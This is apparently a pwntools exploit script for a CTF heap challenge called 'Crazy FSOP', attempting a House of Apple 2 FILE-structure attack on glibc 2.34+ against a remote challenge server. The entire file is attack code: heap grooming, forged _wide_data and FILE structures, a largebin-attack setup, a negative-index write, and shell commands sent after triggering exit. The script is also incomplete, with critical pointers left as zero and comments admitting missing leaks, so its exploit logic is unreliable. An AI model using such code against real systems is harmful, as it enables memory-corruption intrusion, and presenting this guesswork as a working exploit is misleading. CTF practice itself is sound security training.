#!/usr/bin/env python3
"""
House of Apple 2 exploit for Crazy FSOP
Based on roderick01's technique for glibc 2.34+
"""

from pwn import *

elf = ELF('./chal', checksec=False)
libc = ELF('./libc.so.6', checksec=False)

context.binary = elf
context.arch = 'amd64'
context.log_level = 'info'

io = remote('amt.rs', 26797)

def create(idx, size, data):
    io.sendlineafter(b'operation: ', b'1')
    io.sendlineafter(b'note: ', str(idx).encode())
    io.sendlineafter(b'size: ', hex(size).encode())
    io.sendafter(b'data: ', data)

def delete(idx):
    io.sendlineafter(b'operation: ', b'2')
    io.sendlineafter(b'note: ', str(idx).encode())

def view(idx):
    io.sendlineafter(b'operation: ', b'3')
    io.sendlineafter(b'note: ', str(idx).encode())
    io.recvuntil(b'data: ')
    return io.recvline()

success("Starting House of Apple 2 exploit")

# House of Apple 2 key insight:
# The _wide_data->_wide_vtable is NOT checked by IO_validate_vtable
# We can point it anywhere and call arbitrary functions!

info("Step 1: Setup heap and get leaks")

# We need to somehow get libc base
# Let's try a creative approach: use the fact that we can write heap pointers
# to memory and then use those to calculate offsets

# Create chunks
create(0, 0x200, b'/bin/sh\x00' + b'A' * 0x1f8)
create(1, 0x200, b'B' * 0x200)
create(2, 0x100, b'C' * 0x100)

info("Step 2: Craft fake _wide_data structure")

# House of Apple 2 _wide_data layout:
# We need:
# - _wide_data at known/controlled location
# - _wide_data->_wide_vtable pointing to fake vtable
# - fake vtable with __doallocate = system

# Since we don't have libc address, let's try relative approach
# Use the heap itself to store fake structures

# Fake vtable for _wide_data
# At offset 0xe0 in vtable is __doallocate function pointer
fake_wide_vtable = flat({
    0xe0: 0,  # __doallocate - would be system if we had address
}, length=0x100, filler=b'\x00')

create(3, 0x100, fake_wide_vtable)

# Fake _wide_data structure
fake_wide_data = flat({
    0x18: 0,  # _IO_write_base = 0
    0x20: 1,  # _IO_write_ptr != 0 (to trigger overflow)
    0x30: 0,  # _IO_buf_base = /bin/sh address
    0x38: 0,  # _IO_buf_end
    0xe0: 0,  # _wide_vtable pointer (to fake_wide_vtable)
}, length=0x200, filler=b'\x00')

create(4, 0x200, fake_wide_data)

info("Step 3: Craft fake FILE structure")

# Fake FILE structure for House of Apple 2
fake_file = flat({
    0x00: 0,  # _flags
    0x20: 0,  # _IO_write_base = 0
    0x28: 1,  # _IO_write_ptr != 0
    0xa0: 0,  # _wide_data pointer (to fake_wide_data)
    0xd8: 0,  # vtable = _IO_wfile_jumps
}, length=0x200, filler=b'\x00')

create(5, 0x200, fake_file)

info("Step 4: Alternative approach - use stack pivot")

# Another House of Apple variant uses setcontext+61 gadget
# This gadget allows stack pivot from controlled memory

# We could use:
# 1. Overwrite _IO_list_all with our fake FILE
# 2. When exit() is called, it triggers _IO_flush_all_lockp
# 3. This calls our fake vtable functions
# 4. Execute arbitrary code

info("Step 5: Try to trigger via largebin attack")

# Largebin attack can write arbitrary value to arbitrary location
# We can use it to overwrite _IO_list_all

# Create large chunks for largebin
create(6, 0x430, b'D' * 0x430)
create(7, 0x20, b'guard1')
create(8, 0x440, b'E' * 0x440)
create(9, 0x20, b'guard2')

# Free to unsorted bin
delete(6)
delete(8)

# Create smaller chunk to split unsorted bin
# This should move chunks to largebin
create(10, 0x400, b'F' * 0x400)

info("Step 6: Final attempt - controlled crash")

# Even if we can't get perfect shell, let's try to:
# 1. Corrupt memory in a useful way
# 2. Trigger a crash that might leak info
# 3. Or create conditions for exploitation

# Use negative index to write heap pointer to strategic location
try:
    create(-10, 0x100, b'CORRUPT')
    success("Wrote to notes[-10]")
except:
    pass

info("Step 7: Trigger exit")

# Send invalid operation to trigger exit
io.sendline(b'999')
io.sendline(b'0')

time.sleep(1)

# Try shell commands
try:
    io.sendline(b'cat flag*')
    io.sendline(b'ls')
    time.sleep(1)

    output = io.recvall(timeout=2)
    info(f"Output: {output[:300]}")

    if b'{' in output:
        success(f"POSSIBLE FLAG: {output}")
except:
    pass

io.interactive()
